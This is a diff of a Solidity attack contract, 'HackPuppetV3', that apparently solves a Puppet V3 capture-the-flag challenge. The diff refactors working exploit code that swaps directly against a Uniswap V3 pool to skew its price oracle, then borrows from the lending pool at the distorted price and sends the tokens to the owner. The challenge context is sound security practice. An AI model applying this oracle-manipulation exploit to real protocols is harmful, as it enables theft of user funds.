@@ -18,37 +18,27 @@ interface IWETH is IERC20 {
 }
 
 contract HackPuppetV3 is IUniswapV3SwapCallback {
-    IWETH weth;
-    IERC20 token;
-    IUniswapV3Pool pool;
-    PuppetV3Pool lendingPool;
     address owner;
 
-    constructor (
-        IWETH _weth,
-        IERC20 _token,
-        IUniswapV3Pool _pool,
-        PuppetV3Pool  _lendingPool
-    ) {
+    constructor() {
+        // Save owner so we can transfer tokens at the end only to us
         owner = msg.sender;
-        weth = _weth;
-        token = _token;
-        pool = _pool;
-        lendingPool = _lendingPool;
     }
 
-    function swap(int256 amount, uint160 sqrt) public {
-        bytes memory encoded = abi.encode(address(token), address(pool));
-        pool.swap(address(this), false, amount, sqrt, encoded);
+    function swap(address _pool, address _token, int256 amount, uint160 sqrt) public {
+        // Passing encoded arguments so we don't need to write or read storage
+        bytes memory encoded = abi.encode(_token, _pool);
+        // Call directly the swap method of uniswapPool contract
+        IUniswapV3Pool(_pool).swap(address(this), false, amount, sqrt, encoded);
     }
 
-    function borrowAndTransfer(uint256 borrow) public {
+    function borrowAndTransfer(address _lendingPool, uint256 borrow, IWETH _weth, IERC20 _token) public {
         // Approve the amount of weth, so the lending pool can transfer itself that weth amount
-        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
+        _weth.approve(_lendingPool, _weth.balanceOf(address(this)));
         // Borrow the lending
-        lendingPool.borrow(borrow);
+        PuppetV3Pool(_lendingPool).borrow(borrow);
         // Transfer the whole tokens to player address
-        token.transfer(owner, token.balanceOf(address(this)));
+        _token.transfer(owner, _token.balanceOf(address(this)));
     }
 
     // This function is necesary when calling the uniswapPool directly
@@ -58,6 +48,7 @@ contract HackPuppetV3 is IUniswapV3SwapCallback {
         int256 amount1Delta,
         bytes calldata data
     ) external override {
+        // Decode token and pool address
         (address _token, address _pool) = abi.decode(data, (address, address));
         // Transfer the token we're swaping for the one we're receiving
         IERC20(_token).transfer(_pool, uint256(amount1Delta));
